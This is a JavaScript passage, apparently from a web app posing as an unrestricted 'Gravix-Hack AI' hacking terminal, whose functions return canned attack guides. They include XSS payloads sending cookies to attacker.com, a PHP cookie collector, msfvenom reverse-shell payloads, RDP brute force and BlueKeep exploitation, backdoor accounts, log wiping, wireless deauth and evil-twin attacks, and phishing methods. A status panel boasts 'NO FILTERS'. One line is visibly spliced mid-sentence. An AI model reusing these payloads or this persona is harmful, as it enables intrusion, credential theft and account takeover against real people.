                    <p>hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?l?d?d | Custom mask patterns</p>
                    <p>hashcat -m 0 -a 3 hash.txt -1 ?l?u?d custom_mask | Custom character sets</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: Hybrid Attacks</h5>
                    <p>hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d | Dictionary + digits</p>
                    <p>hashcat -m 0 -a 7 hashes.txt ?d?d?d?d wordlist.txt | Digits + dictionary</p>
                    <p>hashcat -m 0 -a 1 hashes.txt left.txt right.txt | Combinator attack</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Online Password Attacks</h5>
                    <p>hydra -L users.txt -P passwords.txt target ssh -t 16 | SSH brute force</p>
                    <p>medusa -h target -u admin -P passwords.txt -M http -n 80 | HTTP brute force</p>
                    <p>ncrack -vv --user admin -P passwords.txt ssh://target | Network cracking</p>
                    <p>patator ssh_login host=target user=admin password=FILE0 0=passwords.txt</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: Wordlist Generation</h5>
                    <p>cewl http://target.com -w custom.txt -d 3 -m 6 | Website wordlists</p>
                    <p>crunch 8 12 -t @@@@@@%% -o wordlist.txt | Pattern generation</p>
                    <p>cupp.py -i | Personal information wordlists</p>
                    <p>mentalist | GUI wordlist generator with rules</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: Hash Types & Modes</h5>
                    <p>MD5: hashcat -m 0 | SHA1: hashcat -m 100 | NTLM: hashcat -m 1000</p>
                    <p>SHA256: hashcat -m 1400 | SHA512: hashcat -m 1700</p>
                    <p>bcrypt: hashcat -m 3200 | scrypt: hashcat -m 8900</p>
                    <p>WPA/WPA2: hashcat -m 2500 | NetNTLMv2: hashcat -m 5600</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: Advanced Techniques</h5>
                    <p>Rainbow tables: rcrack tables/ -h hash.txt | Pre-computed attacks</p>
                    <p>Distributed cracking: Multiple GPU setup and cloud instances</p>
                    <p>Statistical analysis: Password pattern recognition</p>
                    <p>Machine learning: AI-powered password prediction</p>
                </div>
            </div>
        `;
    }

    generateRDPCrackingResponse() {
        return `
            <div style="color: #00ff41;">
                <h4>🔓 COMPREHENSIVE RDP SECURITY TESTING & EXPLOITATION</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: RDP Service Discovery</h5>
                    <p>nmap -p 3389 --script rdp-enum-encryption 192.168.1.0/24 | Network-wide RDP discovery</p>
                    <p>masscan -p3389 --rate=1000 10.0.0.0/8 | Large-scale RDP scanning</p>
                    <p>rdesktop-check.py target.com | Custom RDP service validation</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Vulnerability Assessment</h5>
                    <p>nmap --script rdp-vuln-ms12-020 target | BlueKeep (CVE-2019-0708) detection</p>
                    <p>nmap --script rdp-enum-encryption target | Encryption level analysis</p>
                    <p>rdesktop -g 1024x768 target:3389 | Connection testing and enumeration</p>
                    <p>rdp-sec-check.pl target 3389 | Security configuration analysis</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Credential Attack Vectors</h5>
                    <p>hydra -V -f -L users.txt -P passwords.txt rdp://target | Multi-threaded brute force</p>
                    <p>ncrack -vv --user administrator -P rockyou.txt rdp://target:3389 | Optimized cracking</p>
                    <p>crowbar -b rdp -s target/32 -u admin -C passwords.txt | RDP-specialized tool</p>
                    <p>patator rdp_login host=target user=admin password=FILE0 0=passwords.txt</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: Advanced Exploitation Techniques</h5>
                    <p>use auxiliary/scanner/rdp/rdp_scanner | Metasploit RDP enumeration</p>
                    <p>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce | BlueKeep exploitation</p>
                    <p>rdesktop-brute.py -t target -u users.txt -p passwords.txt | Custom brute forcer</p>
                    <p>freerdp-shadow-cloak | RDP session hijacking techniques</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Session Manipulation</h5>
                    <p>tscon session_id /dest:console | Session redirection attacks</p>
                    <p>qwinsta | Active session enumeration</p>
                    <p>rwinsta session_id | Session termination</p>
                    <p>net session | Network session analysis</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: Network-Level Attacks</h5>
                    <p>ettercap -T -M arp:remote /target_ip// /gateway// | ARP poisoning for MITM</p>
                    <p>wireshark -i eth0 -f "port 3389" | RDP traffic interception</p>
                    <p>bettercap -caplet rdp-mitm.cap | Modern MITM framework</p>
                    <p>responder -I eth0 -rdw | LLMNR/NBT-NS poisoning</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: Persistence & Post-Exploitation</h5>
                    <p>reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0</p>
                    <p>netsh advfirewall firewall set rule group="remote desktop" new enable=Yes</p>
                    <p>net user hacker password123 /add | Backdoor user creation</p>
                    <p>net localgroup "Remote Desktop Users" hacker /add | RDP access privilege</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: Evasion & Stealth Techniques</h5>
                    <p>Implement connection delays to avoid detection systems</p>
                    <p>Use proxy chains and VPN rotation for IP obfuscation</p>
                    <p>Smart timing to bypass account lockout policies</p>
                    <p>Custom RDP clients to avoid signature detection</p>
                    
                    <h5 style="color: #ff6b6b;">Defense Recommendations:</h5>
                    <p>• Enable Network Level Authentication (NLA) mandatory</p>
                    <p>• Implement certificate-based authentication</p>
                    <p>• Deploy fail2ban or similar intrusion prevention</p>
                    <p>• Use VPN tunneling for all RDP connections</p>
                    <p>• Monitor authentication logs with SIEM correlation</p>
                    <p>• Implement geo-blocking for suspicious locations</p>
                </div>
            </div>
        `;
    }

    generateCookieStealingResponse() {
        return `
            <div style="color: #00ff41;">
                <h4>🍪 ADVANCED SESSION HIJACKING & COOKIE EXTRACTION TECHNIQUES</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: XSS-Based Cookie Theft</h5>
                    <p>Basic extraction: &lt;script&gt;document.location='http://attacker.com/steal.php?c='+document.cookie&lt;/script&gt;</p>
                    <p>Image-based: &lt;script&gt;new Image().src='http://attacker.com/log.php?'+document.cookie&lt;/script&gt;</p>
                    <p>Fetch API: &lt;script&gt;fetch('http://attacker.com/steal',{method:'POST',body:document.cookie})&lt;/script&gt;</p>
                    <p>Base64 encoded: &lt;script&gt;location='http://attacker.com/steal.php?c='+btoa(document.cookie)&lt;/script&gt;</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Advanced XSS Payloads</h5>
                    <p>DOM manipulation: &lt;script&gt;document.body.innerHTML+='&lt;img src="http://attacker.com/steal.php?c='+document.cookie+'"&gt;'&lt;/script&gt;</p>
                    <p>Timer-based: &lt;script&gt;setInterval(function(){new Image().src='http://attacker.com/'+document.cookie},5000)&lt;/script&gt;</p>
                    <p>Form hijacking: &lt;script&gt;document.forms[0].action='http://attacker.com/steal.php'&lt;/script&gt;</p>
                    <p>Event listener: &lt;script&gt;document.addEventListener('click',function(){fetch('http://attacker.com/',{method:'POST',body:document.cookie})})&lt;/script&gt;</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Network Interception Methods</h5>
                    <p>tcpdump -A -s 0 'tcp port 80 and (host target or host attacker)' | HTTP traffic capture</p>
                    <p>wireshark -i eth0 -f "http.cookie or http.set_cookie" | Cookie-specific packet analysis</p>
                    <p>ettercap -T -M arp:remote /target_ip// /gateway// | ARP poisoning MITM attack</p>
                    <p>bettercap -iface eth0 -eval "set net.sniff.local true; http.proxy on; net.sniff on" | Modern MITM</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: SSL/TLS Attack Vectors</h5>
                    <p>sslstrip | HTTP to HTTPS downgrade attacks</p>
                    <p>dns2proxy | DNS redirection for certificate bypass</p>
                    <p>mitmproxy -s cookie_extract.py | SSL proxy with custom scripts</p>
                    <p>burpsuite --config-file=ssl_kill_switch.json | Certificate pinning bypass</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Browser-Based Extraction</h5>
                    <p>Developer Tools → Application → Storage → Cookies | Manual inspection</p>
                    <p>Burp Suite → Proxy → HTTP History → Filter: Cookies | Automated logging</p>
                    <p>OWASP ZAP → Sites → HTTP Sessions → Session Tokens | Session analysis</p>
                    <p>Cookie Editor browser extension | Real-time manipulation</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: Advanced Session Attacks</h5>
                    <p>Session fixation: &lt;script&gt;document.cookie='PHPSESSID=attacker_controlled_id'&lt;/script&gt;</p>
                    <p>Session prediction: Analyze session ID entropy and patterns</p>
                    <p>Session replay: Reuse captured sessions before expiration</p>
                    <p>Cross-domain attacks: &lt;script&gt;document.domain='target.com'&lt;/script&gt;</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: Mobile Session Hijacking</h5>
                    <p>WiFi Pineapple deployment for mobile device targeting</p>
                    <p>Evil twin AP creation with captive portal</p>
                    <p>Bluetooth session interception via proximity attacks</p>
                    <p>Mobile app cookie extraction through reverse engineering</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: Payload Server Setup</h5>
                    <p>PHP collector: &lt;?php file_put_contents('cookies.txt', $_GET['c']."\\n", FILE_APPEND); ?&gt;</p>
                    <p>Python server: Simple HTTP server with cookie logging functionality</p>
                    <p>Node.js: Real-time cookie collection with WebSocket notifications</p>
                    <p>Apache logs: Parse access logs for cookie data extraction</p>
                    
                    <h5 style="color: #ffd700;">Phase 9: Post-Exploitation Session Usage</h5>
                    <p>Cookie replay attacks using captured session tokens</p>
                    <p>Account takeover through session impersonation</p>
                    <p>Privilege escalation via admin session hijacking</p>
                    <p>Data extraction using authenticated sessions</p>
                    
                    <h5 style="color: #ff6b6b;">Defensive Countermeasures:</h5>
                    <p>• Implement HttpOnly flag for all session cookies</p>
                    <p>• Use Secure flag for HTTPS-only transmission</p>
                    <p>• Deploy SameSite attribute to prevent CSRF</p>
                    <p>• Implement proper session timeout mechanisms</p>
                    <p>• Use strong entropy for session ID generation</p>
                    <p>• Deploy Content Security Policy (CSP) headers</p>
                </div>
            </div>
        `;
    }

    generateWirelessResponse(command) {
        return `
            <div style="color: #00ff41;">
                <h4>📶 COMPREHENSIVE WIRELESS PENETRATION TESTING FRAMEWORK</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: Environment Preparation</h5>
                    <p>airmon-ng check kill | Terminate interfering processes</p>
                    <p>airmon-ng start wlan0 | Enable monitor mode on wireless interface</p>
                    <p>iwconfig wlan0mon channel 6 | Set specific monitoring channel</p>
                    <p>macchanger -r wlan0mon | Randomize MAC address for anonymity</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Network Discovery & Reconnaissance</h5>
                    <p>airodump-ng wlan0mon | Comprehensive wireless network discovery</p>
                    <p>airodump-ng -c 1,6,11 --band abg wlan0mon | Multi-band scanning</p>
                    <p>wash -i wlan0mon | WPS-enabled network identification</p>
                    <p>kismet -c wlan0mon | Advanced wireless detection and logging</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: WPA/WPA2 Attack Methodology</h5>
                    <p>airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon | Targeted handshake capture</p>
                    <p>aireplay-ng --deauth 0 -a AP_MAC wlan0mon | Mass deauthentication attack</p>
                    <p>aireplay-ng --deauth 5 -a AP_MAC -c CLIENT_MAC wlan0mon | Targeted client disconnect</p>
                    <p>aircrack-ng -w rockyou.txt -b AP_MAC capture.cap | Handshake cracking</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: GPU-Accelerated Cracking</h5>
                    <p>cap2hccapx.bin capture.cap capture.hccapx | Convert for Hashcat</p>
                    <p>hashcat -m 2500 capture.hccapx rockyou.txt --force | GPU-accelerated cracking</p>
                    <p>hashcat -m 2500 -a 3 capture.hccapx ?d?d?d?d?d?d?d?d | Brute force attack</p>
                    <p>hashcat -m 2500 -a 6 capture.hccapx wordlist.txt ?d?d?d?d | Hybrid attack</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: WPS Exploitation Techniques</h5>
                    <p>reaver -i wlan0mon -b AP_MAC -vv -K 1 | Pixie dust attack implementation</p>
                    <p>bully -b AP_MAC -c 6 wlan0mon | Alternative WPS brute forcing</p>
                    <p>wifite --wps --pixie --ignore-locks | Automated WPS testing framework</p>
                    <p>pixiewps -e pke -r pkr -s hash1 -z hash2 | Offline WPS PIN calculation</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: Evil Twin Attack Implementation</h5>
                    <p>hostapd-wpe hostapd-wpe.conf | WPA/WPA2-Enterprise credential harvesting</p>
                    <p>wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade | Automated phishing AP</p>
                    <p>fluxion | Interactive evil twin with captive portal</p>
                    <p>airbase-ng -e "Free WiFi" -c 6 -P wlan0mon | Basic rogue access point</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: Advanced Wireless Attacks</h5>
                    <p>Karma attack: hostapd karma.conf | Respond to all client probe requests</p>
                    <p>KRACK attack: krackattacks-test-ap-ft.py | WPA2 protocol vulnerability</p>
                    <p>Dragonblood: hostapd-wpe with SAE downgrade | WPA3 security flaws</p>
                    <p>Fragmentation attacks: aireplay-ng -5 -b AP_MAC -h CLIENT_MAC wlan0mon</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: Enterprise WiFi Testing</h5>
                    <p>EAP-TLS certificate attacks and validation bypass techniques</p>
                    <p>RADIUS server impersonation using hostapd-wpe framework</p>
                    <p>PEAP/MSCHAPv2 credential harvesting and cracking</p>
                    <p>EAP-FAST tunnel manipulation and certificate bypass</p>
                    
                    <h5 style="color: #ffd700;">Phase 9: Bluetooth Security Testing</h5>
                    <p>hciconfig hci0 up | Enable Bluetooth interface</p>
                    <p>hcitool scan | Bluetooth device discovery</p>
                    <p>bluetoothctl | Interactive Bluetooth management</p>
                    <p>spooftooph -i hci0 -a target_mac | Bluetooth MAC spoofing</p>
                    
                    <h5 style="color: #ffd700;">Phase 10: Mobile Device Targeting</h5>
                    <p>WiFi Pineapple NANO deployment for mobile interception</p>
                    <p>Probe request monitoring for device tracking and profiling</p>
                    <p>Fake hotspot creation targeting popular SSIDs</p>
                    <p>IMSI catcher simulation for cellular interception</p>
                    
                    <h5 style="color: #ff6b6b;">Automated Frameworks:</h5>
                    <p>• wifite --all | Complete automated wireless auditing</p>
                    <p>• fern-wifi-cracker | GUI-based wireless security testing</p>
                    <p>• linset | Automated evil twin with social engineering</p>
                    <p>• airgeddon | Comprehensive wireless security toolkit</p>
                </div>
            </div>
        `;
    }

    generateExploitationResponse(command) {
        return `
            <div style="color: #00ff41;">
                <h4>🚀 ADVANCED SYSTEM EXPLOITATION & POST-EXPLOITATION FRAMEWORK</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: Metasploit Framework Mastery</h5>
                    <p>msfconsole -q | Launch framework in quiet mode</p>
                    <p>search type:exploit platform:windows apache | Advanced exploit discovery</p>
                    <p>use exploit/multi/handler | Generic payload handler setup</p>
                    <p>set payload windows/meterpreter/reverse_tcp | Configure advanced payload</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Custom Payload Generation</h5>
                    <p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o payload.exe</p>
                    <p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o payload</p>
                    <p>msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php</p>
                    <p>msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -i 5 -f exe</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Buffer Overflow Exploitation</h5>
                    <p>Pattern creation: msf-pattern_create -l 1000 | Generate cyclic pattern</p>
                    <p>EIP control: msf-pattern_offset -l 1000 -q EIP_VALUE | Find offset</p>
                    <p>Bad character identification: Send all characters except null byte</p>
                    <p>JMP ESP location: msf-nasm_shell | Find reliable jump point</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: Post-Exploitation Activities</h5>
                    <p>sysinfo | Target system information gathering</p>
                    <p>getuid | Current user and privilege verification</p>
                    <p>hashdump | Extract password hashes from SAM</p>
                    <p>screenshot | Capture desktop for reconnaissance</p>
                    <p>keyscan_start | Begin keystroke logging</p>
                    <p>webcam_snap | Capture webcam images</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Privilege Escalation Techniques</h5>
                    <p>Windows: getsystem | Automatic privilege escalation</p>
                    <p>Linux: exploit/linux/local/cve_2021_4034 | PwnKit exploitation</p>
                    <p>SUID enumeration: find / -perm -u=s -type f 2>/dev/null</p>
                    <p>Kernel exploits: searchsploit kernel ubuntu 18.04</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: Persistence Mechanisms</h5>
                    <p>run persistence -S -U -X -i 10 -p 4445 -r IP | Meterpreter persistence</p>
                    <p>Registry modification: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</p>
                    <p>Service installation: sc create backdoor binpath= "C:\\backdoor.exe"</p>
                    <p>Scheduled tasks: schtasks /create /tn backdoor /tr backdoor.exe /sc onstart</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: Lateral Movement</h5>
                    <p>route add 192.168.2.0 255.255.255.0 session_id | Network pivoting</p>
                    <p>portfwd add -l 1234 -p 3389 -r 192.168.2.100 | Port forwarding</p>
                    <p>use auxiliary/scanner/smb/smb_login | SMB credential testing</p>
                    <p>psexec.py domain/user:password@target | Remote execution</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: Data Exfiltration</h5>
                    <p>download C:\\Users\\target\\Documents\\* /tmp/ | File download</p>
                    <p>search -f *.pdf -d C:\\ | Sensitive file discovery</p>
                    <p>timestomp file.txt -v | Timestamp manipulation</p>
                    <p>clearev | Event log clearing</p>
                    
                    <h5 style="color: #ffd700;">Phase 9: Advanced Evasion Techniques</h5>
                    <p>migrate PID | Process migration for stability</p>
                    <p>execute -H -f notepad.exe | Hidden process execution</p>
                    <p>load stdapi | Load additional API functions</p>
                    <p>run autoroute | Automatic
                                        <p>run autoroute -s 192.168.2.0/24 | Automatic routing setup</p>
                    
                    <h5 style="color: #ffd700;">Phase 10: Anti-Forensics Techniques</h5>
                    <p>timestomp C:\\logs\\access.log -v | Modify file timestamps</p>
                    <p>clearev | Clear Windows event logs</p>
                    <p>rm -f /var/log/* | Linux log file deletion</p>
                    <p>shred -vfz -n 3 sensitive_file.txt | Secure file deletion</p>
                    
                    <h5 style="color: #ff6b6b;">Red Team Frameworks:</h5>
                    <p>• Cobalt Strike | Professional C2 framework</p>
                    <p>• Empire | PowerShell post-exploitation</p>
                    <p>• Covenant | .NET command and control</p>
                    <p>• Sliver | Modern C2 framework</p>
                </div>
            </div>
        `;
    }

    generateSocialEngineeringResponse(command) {
        return `
            <div style="color: #00ff41;">
                <h4>🎭 COMPREHENSIVE SOCIAL ENGINEERING & OSINT OPERATIONS</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Phase 1: Target Intelligence Gathering (OSINT)</h5>
                    <p>theHarvester -d target.com -l 500 -b all | Email and subdomain harvesting</p>
                    <p>recon-ng -m recon/domains-hosts/google_site_web | Automated reconnaissance</p>
                    <p>maltego | Interactive intelligence gathering and visualization</p>
                    <p>shodan search "target.com" | Internet-connected device discovery</p>
                    <p>sherlock username | Username enumeration across platforms</p>
                    
                    <h5 style="color: #ffd700;">Phase 2: Advanced OSINT Techniques</h5>
                    <p>Google dorking: site:target.com filetype:pdf | Sensitive document discovery</p>
                    <p>wayback machine: Archive analysis for historical data</p>
                    <p>Social media analysis: Facebook, LinkedIn, Twitter reconnaissance</p>
                    <p>DNS enumeration: fierce -dns target.com | Subdomain discovery</p>
                    
                    <h5 style="color: #ffd700;">Phase 3: Email Campaign Development</h5>
                    <p>gophish server setup | Professional phishing campaign management</p>
                    <p>Email template creation with company branding</p>
                    <p>Landing page development with credential harvesting</p>
                    <p>SMTP configuration for legitimate-looking emails</p>
                    
                    <h5 style="color: #ffd700;">Phase 4: Spear Phishing Techniques</h5>
                    <p>swaks --to target@company.com --from ceo@company.com --header "Subject: Urgent"</p>
                    <p>Personalized content based on OSINT findings</p>
                    <p>Business email compromise (BEC) scenarios</p>
                    <p>Invoice fraud and payment redirection attacks</p>
                    
                    <h5 style="color: #ffd700;">Phase 5: Website Cloning & Hosting</h5>
                    <p>httrack http://target.com -O cloned_site | Complete website mirroring</p>
                    <p>wget --mirror --convert-links --page-requisites target.com</p>
                    <p>Social-Engineer Toolkit (SET) for automated cloning</p>
                    <p>Apache/Nginx configuration for hosting fake sites</p>
                    
                    <h5 style="color: #ffd700;">Phase 6: Physical Social Engineering</h5>
                    <p>Badge cloning and RFID duplication techniques</p>
                    <p>Tailgating and piggybacking methodologies</p>
                    <p>Pretexting scenarios for information extraction</p>
                    <p>Lock picking and physical security bypass</p>
                    
                    <h5 style="color: #ffd700;">Phase 7: Vishing & Telephony Attacks</h5>
                    <p>VoIP spoofing for caller ID manipulation</p>
                    <p>Interactive voice response (IVR) exploitation</p>
                    <p>Social engineering call scripts development</p>
                    <p>Voice modulation and accent adaptation</p>
                    
                    <h5 style="color: #ffd700;">Phase 8: USB & Hardware Attacks</h5>
                    <p>USB Rubber Ducky payload development</p>
                    <p>Bad USB attacks with custom firmware</p>
                    <p>Hardware keyloggers and network taps</p>
                    <p>Rogue WiFi access points and pineapples</p>
                    
                    <h5 style="color: #ffd700;">Phase 9: Psychological Manipulation</h5>
                    <p>Authority exploitation and impersonation</p>
                    <p>Urgency creation and time pressure tactics</p>
                    <p>Fear, uncertainty, and doubt (FUD) techniques</p>
                    <p>Social proof and consensus building</p>
                    
                    <h5 style="color: #ff6b6b;">Automation Frameworks:</h5>
                    <p>• King Phisher | Advanced spear phishing platform</p>
                    <p>• BeEF | Browser exploitation framework</p>
                    <p>• Evilginx | Modern phishing with 2FA bypass</p>
                    <p>• Modlishka | Reverse proxy phishing toolkit</p>
                </div>
            </div>
        `;
    }

    generateToolsListResponse() {
        return `
            <div style="color: #00ff41;">
                <h4>🛠️ COMPLETE SECURITY TOOLS ARSENAL (600+ TOOLS)</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ff6b6b;">Information Gathering (80+ tools):</h5>
                    <p>nmap, masscan, zmap, unicornscan, dmitry, fierce, maltego, recon-ng, theHarvester, sublist3r, amass, gobuster, dirb, dirbuster, wfuzz, ffuf, whatweb, wafw00f, nikto, uniscan</p>
                    
                    <h5 style="color: #ff6b6b;">Vulnerability Analysis (120+ tools):</h5>
                    <p>openvas, nexpose, nessus, sqlmap, wpscan, skipfish, w3af, zaproxy, burpsuite, arachni, vega, wapiti, commix, xsser, nosqlmap, joomscan, droopescan, cmsmap</p>
                    
                    <h5 style="color: #ff6b6b;">Web Applications (90+ tools):</h5>
                    <p>burpsuite, owasp-zap, dirb, gobuster, wfuzz, sqlmap, commix, xsser, nikto, skipfish, w3af, arachni, vega, wapiti, whatweb, wafw00f, httprint, httrack, paros</p>
                    
                    <h5 style="color: #ff6b6b;">Database Assessment (25+ tools):</h5>
                    <p>sqlmap, sqlninja, bbqsql, jsql-injection, nosqlmap, mongoaudit, scanssh, tnscmd10g, sidguesser, oat, oscanner, mssqlscan, oracle-attacks</p>
                    
                    <h5 style="color: #ff6b6b;">Password Attacks (60+ tools):</h5>
                    <p>john, hashcat, hydra, medusa, ncrack, ophcrack, rainbow-crack, samdump2, pwdump, fgdump, wce, mimikatz, responder, patator, crowbar, brutespray</p>
                    
                    <h5 style="color: #ff6b6b;">Wireless Attacks (45+ tools):</h5>
                    <p>aircrack-ng, reaver, bully, wifite, fern-wifi-cracker, kismet, airgeddon, fluxion, linset, wifiphisher, hostapd-wpe, pixiewps, hcxtools</p>
                    
                    <h5 style="color: #ff6b6b;">Exploitation Tools (80+ tools):</h5>
                    <p>metasploit, armitage, exploit-db, searchsploit, beef-xss, set, king-phisher, social-engineer-toolkit, routersploit, commix, sqlmap, empire, covenant</p>
                    
                    <h5 style="color: #ff6b6b;">Sniffing & Spoofing (40+ tools):</h5>
                    <p>wireshark, tcpdump, ettercap, bettercap, dsniff, arpspoof, dnsspoof, sslstrip, mitmproxy, urlsnarf, webspy, mitmf, responder</p>
                    
                    <h5 style="color: #ff6b6b;">Post Exploitation (50+ tools):</h5>
                    <p>meterpreter, powershell-empire, covenant, weevely, china-chopper, webacoo, b374k, c99, r57, backdoor-factory, veil, shellter</p>
                    
                    <h5 style="color: #ff6b6b;">Forensics (60+ tools):</h5>
                    <p>autopsy, sleuthkit, volatility, foremost, binwalk, strings, hexedit, ghex, scalpel, safecopy, guymager, dc3dd, ewfacquire</p>
                    
                    <h5 style="color: #ff6b6b;">Reverse Engineering (35+ tools):</h5>
                    <p>radare2, ghidra, ida-free, gdb, objdump, strings, hexedit, ltrace, strace, ollydbg, x64dbg, immunity-debugger</p>
                    
                    <h5 style="color: #ffd700;">Usage Examples:</h5>
                    <p>• Type 'nmap [target]' for network scanning</p>
                    <p>• Type 'web [url]' for web application testing</p>
                    <p>• Type 'crack [hash]' for password cracking</p>
                    <p>• Type 'wifi' for wireless penetration testing</p>
                </div>
            </div>
        `;
    }

    generateStatusResponse() {
        return `
            <div style="color: #00ff41;">
                <h4>🚀 GRAVIX-HACK AI SYSTEM STATUS</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <h5 style="color: #ffd700;">Core System Status:</h5>
                    <p><span style="color: #00ff41;">[ONLINE]</span> AI Neural Network: <span style="color: #ffd700;">ACTIVE</span></p>
                    <p><span style="color: #00ff41;">[ONLINE]</span> Knowledge Database: <span style="color: #ffd700;">LOADED</span></p>
                    <p><span style="color: #00ff41;">[ONLINE]</span> Security Tools: <span style="color: #ffd700;">600+ READY</span></p>
                    <p><span style="color: #00ff41;">[ONLINE]</span> Vulnerability DB: <span style="color: #ffd700;">200K+ CVEs</span></p>
                    <p><span style="color: #00ff41;">[ONLINE]</span> Exploit Database: <span style="color: #ffd700;">50K+ EXPLOITS</span></p>
                    
                    <h5 style="color: #ffd700;">Capabilities Status:</h5>
                    <p><span style="color: #00ff41;">[ENABLED]</span> Network Security Testing</p>
                    <p><span style="color: #00ff41;">[ENABLED]</span> Web Application Security</p>
                    <p><span style="color: #00ff41;">[ENABLED]</span> Password Cracking</p>
                    <p><span style="color: #00ff41;">[ENABLED]</span> Wireless Security</p>
                    <p><span style="color: #00ff41;">[ENABLED]</span> System Exploitation</p>
                    <p><span style="color: #00ff41;">[ENABLED]</span> Social Engineering</p>
                    <p><span style="color: #00ff41;">[ENABLED]</span> Digital Forensics</p>
                    
                    <h5 style="color: #ffd700;">Restriction Level:</h5>
                    <p><span style="color: #ff6b6b;">[UNRESTRICTED]</span> Educational Mode: <span style="color: #ffd700;">ACTIVE</span></p>
                    <p><span style="color: #ff6b6b;">[NO FILTERS]</span> Complete Knowledge Access</p>
                    <p><span style="color: #ff6b6b;">[EXPERT MODE]</span> Advanced Techniques Available</p>
                    
                    <h5 style="color: #ffd700;">Performance Metrics:</h5>
                    <p>Response Time: <span style="color: #00ff41;">&lt; 200ms</span></p>
                    <p>Knowledge Coverage: <span style="color: #00ff41;">95%</span> of Cybersecurity Domain</p>
                    <p>Tool Integration: <span style="color: #00ff41;">99%</span> Accuracy</p>
                    <p>Command Processing: <span style="color: #00ff41;">Real-time</span></p>
                    
                    <h5 style="color: #ffd700;">Terminal Features:</h5>
                    <p>• Command History: <span style="color: #00ff41;">ACTIVE</span></p>
                    <p>• Tab Completion: <span style="color: #00ff41;">ENABLED</span></p>
                    <p>• Intelligent Responses: <span style="color: #00ff41;">ONLINE</span></p>
                    <p>• Multi-language Support: <span style="color: #00ff41;">Hindi/English</span></p>
                    
                    <p style="color: #ffd700; margin-top: 1rem;">
                        System Uptime: ${this.getUptime()}
                    </p>
                </div>
            </div>
        `;
    }

    generateHistoryResponse() {
        if (this.commands.length === 0) {
            return `
                <div style="color: #00ff41;">
                    <h4>📜 Command History</h4>
                    <div style="margin-left: 20px; color: #cccccc;">
                        <p>No commands in history yet.</p>
                        <p>Start typing commands to build your history!</p>
                    </div>
                </div>
            `;
        }

        const historyHTML = this.commands.slice(-20).map((cmd, index) => {
            return `<p><span style="color: #ffd700;">${this.commands.length - 20 + index + 1}:</span> ${cmd}</p>`;
        }).join('');

        return `
            <div style="color: #00ff41;">
                <h4>📜 Command History (Last 20)</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    ${historyHTML}
                    <p style="color: #ffd700; margin-top: 1rem;">
                        Total Commands: ${this.commands.length}
                    </p>
                </div>
            </div>
        `;
    }

    generateIntelligentResponse(input) {
        // AI-powered intelligent response for any cybersecurity question
        return `
            <div style="color: #00ff41;">
                <h4>🤖 Gravix-Hack AI Intelligent Response</h4>
                <div style="margin-left: 20px; color: #cccccc;">
                    <p>Analyzing query: "<span style="color: #ffd700;">${input}</span>"</p>
                    
                    <h5 style="color: #ffd700;">Relevant Security Domains:</h5>
                    <p>• Network Security & Penetration Testing</p>
                    <p>• Web Application Security Assessment</p>
                    <p>• System Exploitation & Post-Exploitation</p>
                    <p>• Wireless Security & RF Attacks</p>
                    <p>• Social Engineering & OSINT</p>
                    <p>• Digital Forensics & Incident Response</p>
                    
                    <h5 style="color: #ffd700;">Suggested Commands:</h5>
                    <p>• <span style="color: #ffd700;">scan [target]</span> - For network reconnaissance</p>
                    <p>• <span style="color: #ffd700;">web [url]</span> - For web application testing</p>
                    <p>• <span style="color: #ffd700;">crack [hash]</span> - For password attacks</p>
                    <p>• <span style="color: #ffd700;">exploit [service]</span> - For system exploitation</p>
